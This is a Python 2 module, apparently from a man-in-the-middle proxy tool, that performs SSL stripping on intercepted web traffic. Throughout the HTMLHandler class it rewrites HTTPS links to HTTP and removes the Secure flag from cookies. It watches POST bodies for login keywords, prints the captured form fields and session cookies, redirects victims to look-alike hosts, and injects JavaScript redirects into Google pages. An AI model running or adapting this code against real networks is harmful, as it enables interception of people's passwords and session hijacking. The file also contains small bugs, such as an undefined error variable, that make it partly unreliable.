__author__ = 'leonardo.nve'

import json
import re
import zlib
from urllib import quote_plus
from cStringIO import StringIO
from gzip import GzipFile

HTMLContentTypes        = ['text/html', 'application/javascript', 'application/json', 'text/javascript', 'text/plain']
configuracion = None
request_dictionary = []
response_dictionary = []
secure_regex = re.compile('[\s;]{1}[Ss]ecure[\s;]?', re.IGNORECASE)
host_set_cookies = {}

def HTMLCheck(headers, uri):
    if 'content-type' not in headers:
        return False

    contenttype = headers["content-type"]
    for tipo in HTMLContentTypes:
        if tipo in contenttype:
            return True

    return False

def ireplace(cad, old, new, count=0):
    pattern = re.compile(re.escape(old), re.IGNORECASE)
    return pattern.sub(new, cad, count)

def conditional_replace(host, response_lower):
    # parse google search
    if host.find('www.goo') != -1:
        if '<a href="#" onclick="return go_back();" onmousedown="ctu(\'unauthorizedredirect\',\'originlink\');">' in response_lower:
            pos = response_lower.find('<a href="')+9
            fin = response_lower[pos:].find('"')
            searched_host = response_lower[pos:pos+fin]
            html_redir = """
                <script>window.googleJavaScriptRedirect=1</script><script>var m={navigateTo:function(b,a,d){if(b!=a&&b.google){if(b.google.r){
                    b.google.r=0;b.location.href=d;a.location.replace(\"about:blank\");}}else{a.location.replace(d);}}};
                    m.navigateTo(window.parent,window,\"%s\");</script><noscript><META http-equiv=\"refresh\" content=\"0;URL='%s'\"></noscript>
                <!--
            """ % (searched_host, searched_host)
            response_lower = ireplace(response_lower,'<html', html_redir)
            return response_lower
    return None

def sustituir(datos, diccionario, sprint = False):
    moddatos = datos.encode('hex')

    for sustitucion in diccionario:
        if sustitucion["quantity"] == '0':
            continue

        premoddatos = moddatos
        if sustitucion["quantity"] == 'all':
            moddatos = moddatos.replace(sustitucion["old"], sustitucion["new"])
        else:
            quantity = int(sustitucion["quantity"])
            moddatos = moddatos.replace(sustitucion["old"], sustitucion["new"], quantity)
            if moddatos != premoddatos:
                sustitucion["quantity"] = str(quantity-1)

    # For Debug remove!
    if sprint:  print datos, '(%s) ---- ' % datos.encode('hex'), moddatos.decode('hex'), '(%s)' % moddatos

    return moddatos.decode('hex')

def sustituir_array(array_datos, diccionario, sprint = False):
    array_moddatos = []
    result_moddatos = []
    for datos in array_datos:
        array_moddatos.append(datos.encode('hex'))

    for sustitucion in diccionario:
        for i in range(len(array_moddatos)):
            array_moddatos[i] = array_moddatos[i].replace(sustitucion["old"], sustitucion["new"])

    for moddatos in array_moddatos:
        result_moddatos.append(moddatos.decode('hex'))

    return result_moddatos

def gzipencode(content):
    out = StringIO()
    f = GzipFile(fileobj=out, mode='w', compresslevel=5)
    f.write(content)
    f.close()
    return out.getvalue()

class HTMLHandler:

    def __init__(self, html_config_file, headers, uri, activate_sslstrip):
        # print '[--] HTMLHandler headers: ',headers
        self.configuration = json.loads(open(html_config_file).read())
        self.diccionario = []
        self.gzip_encoded = False
        if headers is not None:
            if 'content-encoding' in headers:
                if headers['content-encoding'].find('gzip') > -1:
                    self.gzip_encoded = True
                else:
                    print '[--] Content-Enconding: ',headers['content-encoding']
            else:
                # print '[--] No content-encoding'
                pass

        for element in self.configuration['mod']:
            # print element['old']
            item = {}
            item['old'] = element['old'].encode('hex')
            item['new'] = element['new'].encode('hex')
            item['quantity'] = element['quantity']
            self.diccionario.append(item)

        self.activate_mods = (len(self.diccionario) > 0)

        self.sslstrip = self.configuration["sslstrip"]
        self.sslstrip_response_diccionario = []
        self.sslstrip_request_diccionario = []
        self.activate_sslstrip = activate_sslstrip
        self.objetivos = self.configuration["sslstrip"]['objetivos']
        if activate_sslstrip:
            self.redir_on_login = self.sslstrip['post_login_redirection']
            for element in self.sslstrip['general_dictionary']:
                item = {}
                item['old'] = element[0].encode('hex')
                item['new'] = element[1].encode('hex')

                item['quantity'] = 'all'
                self.sslstrip_response_diccionario.append(item)
                item2 = {}
                item2['old'] = item['new']
                item2['new'] = item['old']
                item2['d_old'] = element[1]
                item2['d_new'] = element[0]
                item2['quantity'] = 'all'
                self.sslstrip_request_diccionario.append(item2)

            for element in self.sslstrip['request2_dictionary']:
                item2 = {}
                item2['old'] = element[0].encode('hex')
                item2['new'] = element[1].encode('hex')
                item2['d_old'] = ''
                item2['d_new'] = ''
                item2['quantity'] = 'all'
                self.sslstrip_request_diccionario.append(item2)
            # print self.sslstrip_request_diccionario
            self.redir_config = self.sslstrip['redir']
        self.data = ''
        return

    def Bind(self, data, datalen, contentlength = 0):
        # print 'adding data.....'
        self.data += data
        return '', 0, 0

    def Padding(self):
        #No padding needed on HTML mod
        return None

    def sslstrip_response_headers(self, headers):
        cookies = []
        if self.activate_sslstrip:   # If activate_sslstrip
            # print 'sslstrip_response_headers:\n',headers
            bad_response_headers = ['content-length', 'content-md5']#, 'content-security-policy']
            headers2={}
            for key in headers:
                if key in bad_response_headers  or key[:3]=='if-' != -1 :
                    pass
                else:
                    if key == 'set-cookie':
                        #print '[--] Removing Secure flag: ',headers[key]
                        cookies.append(secure_regex.sub(';xxxxxx;',headers[key]))
                        #print '[--] Removed  Secure flag: ',headers[key]

                    else:
                        # print '[--] Header',key, headers[key]
                        headers2[key] = sustituir(headers[key], self.sslstrip_response_diccionario)

            return headers2,cookies

        return headers,cookies

    # def sslstrip_request_headers(self, headers):

    def Final(self, host, postData, originalRequest):
        # print 'len data: ', len(self.data)
        # print '[--] Final called...'
        if self.activate_sslstrip: 
            data = ''
            # If activate_sslstrip
            if self.data != '':
                if self.gzip_encoded:
                    try:
                        data2 = GzipFile('', 'r', 0, StringIO(self.data)).read()
                        self.data = data2
                    except:
                        print "[--] decompress error %s" % err
                        return data, None
            
            if self.redir_on_login and postData != '':
                lpostData = postData.lower()
                # print '[--] Final() lpostData:\n', lpostData
                for key in self.sslstrip['keywords']:
                    # print '[--] Looking for ',key
                    if re.search(key,lpostData):
                        print '[--] Keyword found (%s)' % key
                        redir = self.redir_config
                        for entry in redir:
                            print '[--] Checking... %s (%s)' % (redir[entry]['uri'],host)
                            if redir[entry]['uri'] == host:
                                print '[--] Candidato... !!!'
                                if redir[entry]['lookfor'] == '' or re.search(redir[entry]['lookfor'],self.data):
                                    print '[++] Keyword found (%s):\n' % key, json.dumps(originalRequest['args'],sort_keys=True, indent=4)
                                    print '[++] Activando redireccionamiento a ', redir[entry]['redirection']
                                    host = '%s%s'%(self.sslstrip['redir_prefijo'],entry)
                                    cookies = ''
                                    print '[++] Cookies de la sesion:\n', json.dumps(originalRequest['cookies'],sort_keys=True, indent=4)
                                    for cookie in originalRequest['cookies']:
                                        cookies = cookies + cookie + '; '#'%s=%s ;' % (cookie, originalRequest['cookies'][cookie])
                                    cookies = sustituir(cookies, self.sslstrip_request_diccionario)
                                    # print '[++] Cookies from server: ',cookies
                                    host_set_cookies[host] = [cookies, redir[entry]['redirection']]
                                    redirect_html = '<html><body><script>window.location.replace(%%22http://%s/%%22)</script></body></html>' % host
                                    # print '[--] Primera fase redireccionamiento: ', host
                                    return str(redirect_html), str('http://'+host+'/')

                                    # print 'Ungziped data:\n',self.data
            data = sustituir(self.data, self.sslstrip_response_diccionario)
            google_search = conditional_replace(host,data.lower())
            if google_search is not None:
                data = google_search
            if self.gzip_encoded:
                data = gzipencode(data) 
            self.data = data

        if self.activate_mods and self.data != '':
            data = ''
            if self.gzip_encoded:
                try:
                    data2 = GzipFile('', 'r', 0, StringIO(self.data)).read()
                    self.data = data2
                except:
                    print "[--] decompress error %s" % err
                    pass
                
                # print 'Ungziped data:\n',self.data
                
            data = sustituir(self.data, self.diccionario)
            if self.gzip_encoded:
                data = gzipencode(data)
            return data, None

        return self.data, None


    def request_string_sslstrip(self, cad):
        if not self.activate_sslstrip:
            return cad

        return sustituir(cad,self.sslstrip_request_diccionario)

    def response_string_sslstrip(self, cad):
        if not self.activate_sslstrip:
            return cad

        return sustituir(cad,self.sslstrip_response_diccionario)

    def check_host(self, host):
        host2 = host
        port = 80
        for domain in self.sslstrip_request_diccionario:
            dlen = len(domain['d_old'])
            # print '[--] Checking domain %s' % host[0-dlen:], domain['d_old']
            if host[0-dlen:] == domain['d_old']:
                host2 = host.replace(domain['d_old'], domain['d_new'])
                # print '[--] Host: %s:%d => %s:443 (https)' % (host, port, host2)
                port = 443

        # TODO: Filtrar por HOSTS
        if self.objetivos[0] == 'any':
            return [host2, port]
        else:
            for objetivo in self.objetivos:
                if objetivo in host2:
                    # print '[++] Stripping:',host2
                    return [host2,port]
        
        # print '[++] No stripping host:', host2
        return None


    # '''
    # Modify_Request:
    #     Recibe URI, host de destino, requestdata y cabeceras de forma opcional.
    #     Devuelve nuevo host, puerto de conexion, SSL true o false, nueva uri, nueva request data y nuevas cabeceras
    # '''

    def Modify_Request(self, uri, host, requestdata, headers = None):
        if not self.activate_sslstrip:
            return host, 80, uri, requestdata, headers

        
        newredir = self.check_host(host)
        if newredir is None:
            return host, 80, uri, requestdata, headers
        host2 = newredir[0]
        port  = newredir[1]

        # reqlower = requestdata.lower()

        # print 'Request headers:'
        if headers is not None:
                for key in headers:
                    # print key,':',
                    for indice in range(len(headers[key])):
                        # print headers[key][indice],' (',
                        headers[key][indice] = sustituir(headers[key][indice], self.sslstrip_request_diccionario)
                        # print headers[key][indice],') ; '
                    
        array_moddatos = sustituir_array([requestdata, uri], self.sslstrip_request_diccionario)
        req = array_moddatos[0]
        uri = array_moddatos[1]
        # req  = sustituir(requestdata, self.sslstrip_request_diccionario)
        # uri  = sustituir(uri, self.sslstrip_request_diccionario)
                


        # print '[--]',host,'--> ',host
        # if newhost != host:
        #     port = 443
        return host2, port , uri, req, headers
